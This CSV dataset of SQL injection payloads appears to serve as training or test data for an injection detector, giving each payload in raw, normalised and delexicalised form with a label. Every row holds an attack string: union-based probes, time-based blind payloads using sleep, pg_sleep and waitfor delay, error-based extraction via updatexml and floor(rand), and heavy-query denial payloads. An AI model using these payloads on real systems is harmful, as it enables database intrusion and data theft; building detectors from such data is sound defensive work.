payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1%"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>%"" ) ) ) or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  ""","-3782%"" ) or make_set ( 9354 = 9354,7185 ) and ( ""%"" = """,-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,<NUM>' ) ) as eltx where <NUM> = <NUM> and <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) --,1,False,,sqli_dataset
"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#","-5606 ) union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#","-<NUM> ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
select pg_sleep  (  5  )   and   (  'itgc'  =  'itgc,select pg_sleep ( 5 ) and ( 'itgc' = 'itgc,select pg_sleep ( <NUM> ) and ( <STR> = 'itgc,1,False,,sqli_dataset
"-9240' union all select 6538,6538,6538#","-9240' union all select 6538,6538,6538#","-<NUM>' union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
select case when 7634  =  3954 then 1 else null end--,select case when 7634 = 3954 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--,1,False,,sqli_dataset
"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --","1' ) where 9381 = 9381 or elt ( 6272 = 6272,sleep ( 5 ) ) --","<NUM>' ) where <NUM> = <NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  ""","1%"" ) ) or sleep ( 5 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) where <NUM> = <NUM> or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>%' ) ) and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,-<NUM><STR>wsrq<STR>wsrq,1,False,,sqli_dataset
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,<NUM> ) ) as rvex where <NUM> = <NUM> and <NUM> = <NUM>#,1,False,,sqli_dataset
1'  )   where 4500  =  4500,1' ) where 4500 = 4500,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--","1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--","<NUM>%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'nhrc' like 'nhrc,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,<NUM><STR>nhrc<STR>nhrc,1,False,,sqli_dataset
"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#","-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1'  )   where 5680  =  5680 and   (  3020  =  3020  )  *6703--,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,<NUM>' ) where <NUM> = <NUM> and ( <NUM> = <NUM> ) *<NUM>--,1,False,,sqli_dataset
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'jylk'  =  'jylk","1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",<NUM><STR>jylk<STR>jylk,1,False,,sqli_dataset
"1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--","1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--","<NUM> ) ) as jmcp where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk","1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",<NUM><STR>bkrk<STR>bkrk,1,True,,sqli_dataset
"-8794   )    )     )   union all select 5802,5802,5802--","-8794 ) ) ) union all select 5802,5802,5802--","-<NUM> ) ) ) union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  ""","1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1""   )    )    as nhus where 3689  =  3689","1"" ) ) as nhus where 3689 = 3689","<NUM>"" ) ) as nhus where <NUM> = <NUM>",1,False,,sqli_dataset
"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd","-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",-<NUM><STR>egdd<STR>egdd,1,False,,sqli_dataset
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1' where 7725 = 7725 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM>' where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #,1,False,,sqli_dataset
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--","select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--","select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM>--",1,False,,sqli_dataset
"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--","-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--","-<NUM><STR>avjk' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--",1,True,,sqli_dataset
"-1722' union all select 1408,1408,1408#","-1722' union all select 1408,1408,1408#","-<NUM>' union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
-1940 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),-1940 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),-<NUM> or <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ),1,False,,sqli_dataset
1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',1'|| ( select 'npdx' from dual where 9486 = 9486 and sleep ( 5 ) ) ||',<NUM><STR>npdx<STR>,1,False,,sqli_dataset
1  )   as bidc where 5268  =  5268 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1 ) as bidc where 5268 = 5268 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,<NUM> ) as bidc where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) fzno ) --,1,False,,sqli_dataset
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )","1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 )","<NUM>' and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> )",1,True,,sqli_dataset
1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,1' ) ) as nsfx where 9553 = 9553 rlike sleep ( 5 ) --,<NUM>' ) ) as nsfx where <NUM> = <NUM> rlike sleep ( <NUM> ) --,1,False,,sqli_dataset
1 where 3744  =  3744,1 where 3744 = 3744,<NUM> where <NUM> = <NUM>,1,False,,sqli_dataset
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )","1, ( select 6825 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6825 = 6825,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )","<NUM>, ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a )",1,True,,sqli_dataset
"1""  )   as eaxo where 2728  =  2728","1"" ) as eaxo where 2728 = 2728","<NUM>"" ) as eaxo where <NUM> = <NUM>",1,False,,sqli_dataset
"1""   )    )    as tsry where 6594  =  6594 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --","<NUM>"" ) ) as tsry where <NUM> = <NUM> or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --",1,True,,sqli_dataset
1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,<NUM><STR>gvoh<STR>gvoh,1,False,,sqli_dataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh","select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""vfvh"" = ""vfvh","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual and ( ( <STR> = ""vfvh",1,False,,sqli_dataset
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq","1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'rupq' = 'rupq",<NUM><STR>rupq<STR>rupq,1,False,,sqli_dataset
-3501'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'spvx'  =  'spvx,-3501' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'spvx' = 'spvx,-<NUM><STR>spvx<STR>spvx,1,False,,sqli_dataset
"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","1' ) ) as xjen where 6791 = 6791 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>' ) ) as xjen where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu","1"" ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""sdvu"" like ""sdvu",<NUM><STR>sdvu<STR>sdvu,1,True,,sqli_dataset
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'brhc' like 'brhc,<NUM><STR>brhc<STR>brhc,1,False,,sqli_dataset
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,select ( case when ( 3486 = 6373 ) then 3486 else 3486* ( select 3486 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #,1,False,,sqli_dataset
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj","1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",<NUM><STR>mttj<STR>mttj,1,True,,sqli_dataset
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  ""","select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = ""","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( ( ( <STR> = """,1,False,,sqli_dataset
"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","1"" where 3274 = 3274 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --","<NUM>"" where <NUM> = <NUM> or ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) --",1,True,,sqli_dataset
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt","1"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""cwpt"" like ""cwpt",<NUM><STR>cwpt<STR>cwpt,1,False,,sqli_dataset
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar","1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'tvar' = 'tvar",<NUM><STR>tvar<STR>tvar,1,False,,sqli_dataset
1%'  )   and sleep  (  5  )   and   (  '%'  =  ',1%' ) and sleep ( 5 ) and ( '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#","-4770 ) ) ) union all select 6356,6356,6356,6356,6356#","-<NUM> ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"waitfor delay '0:0:5' and    (    (     (  ""%""  =  ""","waitfor delay '0:0:5' and ( ( ( ""%"" = ""","waitfor delay <STR> and ( ( ( <STR> = """,1,False,,sqli_dataset
select   (  case when   (  6969  =  5797  )   then 6969 else 6969*  (  select 6969 from information_schema.character_sets  )   end  )  #,select ( case when ( 6969 = 5797 ) then 6969 else 6969* ( select 6969 from information_schema.character_sets ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) #,1,False,,sqli_dataset
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',1%' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1  )   where 1333  =  1333 order by 1--,1 ) where 1333 = 1333 order by 1--,<NUM> ) where <NUM> = <NUM> order by <NUM>--,1,False,,sqli_dataset
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#","1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#","<NUM>%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1""   )    )     )   order by 1--","1"" ) ) ) order by 1--","<NUM>"" ) ) ) order by <NUM>--",1,False,,sqli_dataset
"-3699%'   )    )     )   union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#","-3699%' ) ) ) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#","-<NUM>%' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1'||  (  select 'hkvl' from dual where 8882  =  8882,1'|| ( select 'hkvl' from dual where 8882 = 8882,<NUM><STR>hkvl' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )","1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )","<NUM> or updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> )",1,True,,sqli_dataset
"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' ) and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1%' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1%' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>%' and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""qowc"" like ""qowc","1"" ) and ( 3020 = 3020 ) *6703 and ( ""qowc"" like ""qowc",<NUM><STR>qowc<STR>qowc,1,False,,sqli_dataset
"1%""  )   union all select null,null,null,null,null,null--","1%"" ) union all select null,null,null,null,null,null--","<NUM>%"" ) union all select null,null,null,null,null,null--",1,False,,sqli_dataset
1'   )    )    as tcby where 5213  =  5213,1' ) ) as tcby where 5213 = 5213,<NUM>' ) ) as tcby where <NUM> = <NUM>,1,False,,sqli_dataset
"1'   )    )    as kgiw where 7452  =  7452 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' ) ) as kgiw where 7452 = 7452 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' ) ) as kgiw where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--","1"" where 7290 = 7290 union all select null,null,null,null,null,null,null--","<NUM>"" where <NUM> = <NUM> union all select null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1  )   as zdym where 1578  =  1578 union all select null,null,null#","1 ) as zdym where 1578 = 1578 union all select null,null,null#","<NUM> ) as zdym where <NUM> = <NUM> union all select null,null,null#",1,False,,sqli_dataset
"1'   )    )    union all select null,null,null,null,null,null,null--","1' ) ) union all select null,null,null,null,null,null,null--","<NUM>' ) ) union all select null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj","1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'vcvj' = 'vcvj",<NUM><STR>vcvj<STR>vcvj,1,False,,sqli_dataset
1'  )   and 2305  =  1934,1' ) and 2305 = 1934,<NUM>' ) and <NUM> = <NUM>,1,False,,sqli_dataset
"1' in boolean mode  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #","1' in boolean mode ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #","<NUM>' in boolean mode ) and ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) #",1,True,,sqli_dataset
"1',  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )","1', ( select ( case when ( 7616 = 7616 ) then 1 else 1/ ( select 0 ) end ) )","<NUM>', ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) )",1,False,,sqli_dataset
